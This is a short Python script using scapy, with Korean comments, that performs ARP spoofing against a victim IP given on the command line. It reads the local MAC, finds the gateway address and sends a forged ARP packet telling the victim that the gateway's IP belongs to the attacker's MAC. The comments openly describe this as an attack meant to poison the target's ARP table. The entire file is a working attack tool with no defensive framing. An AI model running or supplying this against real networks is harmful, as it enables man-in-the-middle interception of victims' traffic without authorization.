# coding:utf-8
# author:Wr4ith

import sys, subprocess
from scapy.all import *


# 공격 대상 IP 입력 확인
def usage():
	print "Usage : %s VICTIM_IP" % sys.argv[0]
	print "   ex : %s 192.168.100.120" % sys.argv[0]


# 공격자 MAC 주소 가져옴
def get_my_mac():
	with open('/sys/class/net/ens33/address') as f:
		mac = f.read().upper()
		return mac


# 동일 서브넷 기준, 게이트웨이 IP 가져옴
def get_gw_addr():
	cmd = "ip r | awk '/^def/{print $3}'"
	gw_addr = subprocess.check_output(cmd, shell=True)
	
	return gw_addr



if __name__ == "__main__":
	# 공격 대상 IP 입력 확인
	if len(sys.argv) != 2:
		usage()
		sys.exit(-1)

	my_mac = get_my_mac()
	gw_addr = get_gw_addr()

	print "My MAC Addr :", my_mac
	print "GW IP  Addr :", gw_addr

	# 공격 대상에게 ARP 패킷 전송(GW IP에 대한 맥을 공격자의 맥으로 세팅하라는 패킷)
	# 공격 대상 ARP 테이블이 변조되지 않으면 다수의 arp 패킷 전송
	packet = Ether()/ARP(op="who-has", hwsrc=my_mac,psrc=gw_addr,pdst=sys.argv[1])
	sendp(packet)
